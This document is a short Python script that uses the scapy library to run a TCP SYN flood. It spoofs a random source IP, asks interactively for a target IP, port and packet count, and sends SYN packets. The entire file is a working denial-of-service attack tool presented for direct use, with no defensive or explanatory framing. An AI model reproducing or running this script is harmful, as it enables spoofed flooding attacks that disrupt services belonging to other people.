from os import system
from sys import stdout
from random import choice
from random import getrandbits
from ipaddress import IPv4Address
from scapy.all import IP, TCP, send

DEFAULT_IP = "127.0.0.1"
DEFAULT_PORT = 80
DEFAULT_PACKETS_AMOUT = 10
FILE_SIZE = 100_000

class Memoize:
	def __init__(self, fn):
		self.fn = fn
		self.memo = {}

	def __call__(self, *args):
		if args not in self.memo:
			self.memo[args] = self.fn(*args)

		return self.memo[args]

@Memoize
def readFile(path):
	file = open(path, "r")

	skipSize = choice(range(0, FILE_SIZE))

	file.read(skipSize)

	return file

def getRand():
	text = readFile("PI.txt")
	size = choice(range(3, 6))

	return int(text.read(size))

def randomIP():
	bits = getrandbits(32) # generates an integer with 32 random bits
	addr = IPv4Address(bits) # instances an IPv4Address object from those bits

	return str(addr)

def configureIP(ip):
	IP_Packet = IP()
	IP_Packet.src = randomIP()
	IP_Packet.dst = ip

	return IP_Packet

def configureTCPPacket(port):
	TCP_Packet = TCP()
	TCP_Packet.dport = port
	TCP_Packet.flags = "S" # SYN
	TCP_Packet.seq = getRand()
	TCP_Packet.sport = getRand()
	TCP_Packet.window = getRand()

	return TCP_Packet

def SYNFlood(IP_Packet, TCP_Packet, counter):
	print("Packets are sending ...")

	for x in range(0, counter):
		send(IP_Packet / TCP_Packet, verbose=False)

	stdout.write("\nTotal packets sent: %i\n" % counter)

def params():
	destIP = input("Target IP (default: %s): " % DEFAULT_IP) or DEFAULT_IP
	destPort = input("Target Port (default: %s): " % DEFAULT_PORT) or DEFAULT_PORT
	counter = input("How many packets do you want to send (default %s): " % DEFAULT_PACKETS_AMOUT) or DEFAULT_PACKETS_AMOUT

	return destIP, int(destPort), int(counter)


def main():
	system('clear')

	destIP, destPort, counter = params()

	ip = configureIP(destIP)
	tcp = configureTCPPacket(destPort)

	SYNFlood(ip, tcp, counter)

main()
